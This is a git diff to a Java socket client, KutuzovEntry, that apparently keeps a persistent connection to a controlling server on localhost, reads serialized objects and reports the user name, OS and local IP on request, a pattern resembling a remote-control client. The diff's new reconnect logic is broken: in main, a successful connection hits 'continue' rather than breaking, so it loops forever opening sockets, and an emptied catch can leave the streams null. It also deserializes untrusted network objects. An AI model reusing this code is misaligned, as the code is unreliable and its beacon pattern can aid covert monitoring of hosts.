@@ -11,26 +11,55 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.concurrent.atomic.AtomicReference;
 
 public class KutuzovEntry {
-    private static ArrayList<Socket> sockets = new ArrayList<>();
+    public  static final String HOST = "localhost";
+    public  static final int    PORT = 33901;
 
-    public static void main(String[] args) throws Exception {
-        Socket socket = new Socket("localhost", 33901);
+    private static Socket socket;
+    public  static void main(String[] args) {
+        try {
+            socket = new Socket(HOST, PORT);
+        } catch (IOException e) {
+            System.out.println("[M0] Connection lost, reconnecting...");
+            e.printStackTrace();
+            while (true) {
+                try {
+                    socket = new Socket(HOST, PORT);
+                    Thread.sleep(100);
+                    continue;
+                } catch (Exception e1) {
+                    System.out.println("[M1] Connection lost, reconnecting...");
+                    e1.printStackTrace();
+                }
+            }
+        }
         Thread thread = new Thread(()->{
             ObjectInputStream ois = null;
             ObjectOutputStream oos = null;
             try {
                 ois = new ObjectInputStream(socket.getInputStream());
                 oos = new ObjectOutputStream(socket.getOutputStream());
-            } catch (IOException e) {
-                e.printStackTrace();
-                return;
-            }
+            } catch (IOException e) {}
 
             while(true) {
-                if(socket.isClosed())
-                    break;
+                try {
+                    socket.sendUrgentData(0x02);
+                } catch (IOException e) {
+                    System.out.println("[W0] Connection lost, reconnecting...");
+                    while (true) {
+                        try {
+                            Thread.sleep(100);
+                            socket = new Socket(HOST, PORT);
+                            ois = new ObjectInputStream(socket.getInputStream());
+                            oos = new ObjectOutputStream(socket.getOutputStream());
+                            break;
+                        } catch (IOException | InterruptedException e1) {
+                            System.out.println("[W1] Connection lost, reconnecting...");
+                        }
+                    }
+                }
 
                 try {
                     Object packet = ois.readObject();
@@ -64,10 +93,13 @@ public class KutuzovEntry {
                         String identifierName = System.getProperty("user.name");
                         String os = System.getProperty("os.name");
                         String localHost = InetAddress.getLocalHost().getHostAddress();
-
                         oos.writeObject(new CSHandshakePacket(identifierName, localHost, os));
                     }
-                } catch (Exception ignored) { }
+                } catch (Exception ignored) {
+                    try {
+                        socket.sendUrgentData(0x02);
+                    } catch (IOException e) {}
+                }
             }
         });
         thread.start();
